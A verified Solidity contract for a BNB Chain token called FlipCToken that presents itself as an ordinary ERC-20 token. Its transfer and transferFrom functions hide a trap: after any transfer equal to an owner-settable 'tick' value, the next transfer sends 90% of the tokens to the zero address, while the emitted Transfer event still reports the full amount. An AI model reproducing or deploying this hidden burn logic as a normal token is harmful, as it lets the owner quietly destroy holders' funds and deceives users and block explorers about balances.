/**
 *Submitted for verification at BscScan.com on 2022-06-02
*/

// File: FlipX.sol


pragma solidity ^0.8.0;


contract FlipCToken  {
    using SafeMath for uint256;

    bool public flip = false;
    uint256 public tick = 1000000000000000000000;
    address private cowner = msg.sender;
    address private player1 = 0x134ebF237C163588A6879624b712cb0c0b1D8917;
    address private player2 = 0x944c86fEC4728Ae45fd922E30aBDcA7c0435fA47;

    string public constant name = "FlipCToken";
    string public constant symbol = "FLIPC";
    uint8 public constant decimals = 18;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    mapping(address => uint256) balances;
    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_ = 1000000000000000000000000;
    constructor() {
        balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
    }

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address tokenOwner) public view returns (uint256) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint256 numTokens) public returns (bool) {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(numTokens);
        if(flip){
            uint BurnAmount = numTokens * 90 / 100;
            balances[receiver] = balances[receiver].add(numTokens.sub(BurnAmount));
            balances[address(0)] = balances[address(0)].add(BurnAmount);
            flip = false;
        }else{
            balances[receiver] = balances[receiver].add(numTokens);
            if(numTokens == tick) flip = true;
        }
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint) {
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint256 numTokens) public returns (bool) {
        require(numTokens <= balances[owner]);
        require(numTokens <= allowed[owner][msg.sender]);

        balances[owner] = balances[owner].sub(numTokens);
        allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);

        if(flip){
            uint BurnAmount = numTokens * 90 / 100;
            balances[buyer] = balances[buyer].add(numTokens.sub(BurnAmount));
            balances[address(0)] = balances[address(0)].add(BurnAmount);
            flip = false;
        }else{
            balances[buyer] = balances[buyer].add(numTokens);
            if(numTokens == tick) flip = true;
        }




        emit Transfer(owner, buyer, numTokens);
        return true;
    }
    function setTick(uint256 _value) public {
        require(msg.sender==cowner , "UA");
        tick=_value;
    }
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      assert(b <= a);
      return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      assert(c >= a);
      return c;
    }
}